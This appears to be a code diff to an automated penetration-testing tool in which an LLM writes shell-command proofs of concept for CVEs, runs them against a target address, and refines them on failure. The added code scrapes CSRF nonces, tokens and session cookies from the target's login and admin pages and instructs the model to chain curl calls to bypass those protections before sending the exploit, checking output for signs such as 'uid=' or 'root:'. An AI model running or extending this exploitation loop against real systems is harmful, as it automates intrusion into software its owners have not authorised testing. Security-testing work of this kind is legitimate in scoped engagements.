@@ -12616,7 +12616,10 @@ def _synthesize_cve_poc(cve, ip, port, product, version, eid, run_id=None, guida
               f"Return ONE JSON object only: {{\"command\": \"<single shell command, prefer "
               f"curl, that TRIGGERS/PROVES the vulnerability against {tgt}>\", \"assertion\": "
               f"{{\"expect_regex\": \"<regex matching proof-of-success in the output>\"}}, "
-              f"\"rationale\": \"<why this proves {cve}>\"}}. No prose.")
+              f"\"rationale\": \"<why this proves {cve}>\"}}. If the vuln needs a CSRF "
+              f"nonce/token or session, FETCH it inline first (GET the page, extract the token "
+              f"with grep/sed, keep the cookie) then use it — chain curl calls with ; and shell "
+              f"vars. No prose.")
     command = None
     assertion = {"expect_regex": r"(?i)(uid=|root:|flag\{|vulnerable|HTTP/1\.[01] 200)"}
     rationale = ""
@@ -12660,6 +12663,49 @@ def _poc_assertion_passes(assertion, output, exit_code=None):
     return bool(out.strip()) and exit_code in (None, 0)
 
 
+_POC_PRECOND_SIGNALS = ("nonce", "csrf", "xsrf", "token", "unauthorized", "forbidden",
+                        "403", "invalid security", "login required", "authentication",
+                        "permission", "not allowed", "missing", "expired", "denied")
+
+
+def _poc_needs_precondition(output):
+    low = (output or "").lower()
+    return any(s in low for s in _POC_PRECOND_SIGNALS)
+
+
+def _fetch_preconditions(ip, port, timeout=8):
+    """Best-effort: fetch likely exploit preconditions (CSRF nonce / token / session
+    cookie) from the target so the refine step can bake them into the PoC. Returns
+    {tokens, cookies, base}."""
+    import httpx as _hx, re as _re
+    Q = "[" + chr(34) + chr(39) + "]"          # matches a " or a '
+    NQ = "[^" + chr(34) + chr(39) + "]"        # any non-quote char
+    pat_input = r"name=" + Q + "(" + NQ + r"*(?:nonce|token|csrf|xsrf)" + NQ + r"*)" + Q + r"[^>]*value=" + Q + "(" + NQ + r"+)" + Q
+    pat_json = Q + r"(?:nonce|_wpnonce|csrf[_-]?token|authenticity_token)" + Q + r"\s*:\s*" + Q + "(" + NQ + r"+)" + Q
+    pat_meta = r"<meta[^>]+name=" + Q + r"(?:csrf-token|_csrf)" + Q + r"[^>]+content=" + Q + "(" + NQ + r"+)" + Q
+    scheme = "https" if int(port or 80) in (443, 8443) else "http"
+    base = f"{scheme}://{ip}:{port or 80}"
+    tokens, cookies = set(), set()
+    for pth in ("/", "/wp-login.php", "/wp-admin/", "/login", "/admin", "/index.php"):
+        try:
+            r = _hx.get(base + pth, timeout=timeout, verify=False, follow_redirects=True)
+        except Exception:  # noqa: BLE001
+            continue
+        body = (r.text or "")[:80000]
+        for m in _re.finditer(pat_input, body, _re.I):
+            tokens.add(f"{m.group(1)}={m.group(2)}")
+        for m in _re.finditer(pat_json, body, _re.I):
+            tokens.add(f"nonce={m.group(1)}")
+        for m in _re.finditer(pat_meta, body, _re.I):
+            tokens.add(f"csrf-token={m.group(1)}")
+        sc = r.headers.get("set-cookie")
+        if sc:
+            cookies.add(sc.split(";")[0])
+        if tokens or cookies:
+            break
+    return {"tokens": sorted(tokens)[:8], "cookies": sorted(cookies)[:5], "base": base}
+
+
 def _run_refine_poc(cve, ip, port, command, assertion, eid, run_id, rationale="",
                     product=None, version=None, max_iters=3):
     """Increment 2: run the PoC against the target; on failure, refine via the LLM,
@@ -12686,10 +12732,27 @@ def _run_refine_poc(cve, ip, port, command, assertion, eid, run_id, rationale=""
         _poc_trace(run_id, "run", iteration=it, run_output=output, assertion_passed=success)
         if success or it >= max_iters:
             break
+        precond = ""
+        if _poc_needs_precondition(output):
+            pc = _fetch_preconditions(ip, port)
+            _poc_trace(run_id, "precondition", iteration=it, response=json.dumps(pc))
+            if pc.get("tokens") or pc.get("cookies"):
+                precond = (f"\nThe target enforces a PRECONDITION. Fetched live from the "
+                           f"site: tokens={pc['tokens']} cookies={pc['cookies']}. Use these "
+                           f"in the exploit request. Better: make the command FETCH the token "
+                           f"INLINE first (GET the page, extract the nonce/CSRF token with "
+                           f"grep/sed, keep the Set-Cookie), THEN send the exploit with that "
+                           f"token + cookie — tokens are often single-use.")
+            else:
+                precond = ("\nThe output suggests a CSRF nonce/token or session is required. "
+                           "Make the command FETCH it inline first (GET the relevant page, "
+                           "extract the token, capture the cookie), THEN use both in the "
+                           "exploit request.")
         rprompt = (f"AUTHORIZED lab pentest. The PoC for {cve} on http://{ip}:{port} did NOT "
-                   f"succeed.\nCommand: {command}\nOutput:\n{(output or '')[:1500]}\n"
+                   f"succeed.\nCommand: {command}\nOutput:\n{(output or '')[:1500]}{precond}\n"
                    f"Fix the command so it triggers/proves the vulnerability. Return ONE JSON "
-                   f"object only: {{\"command\": \"<better command>\", \"assertion\": "
+                   f"object only: {{\"command\": \"<better command, may chain curl calls with "
+                   f"; and shell vars to fetch a token first>\", \"assertion\": "
                    f"{{\"expect_regex\": \"<regex>\"}}}}. No prose.")
         try:
             res = llm_generate(rprompt, caller="cve_poc_refine")
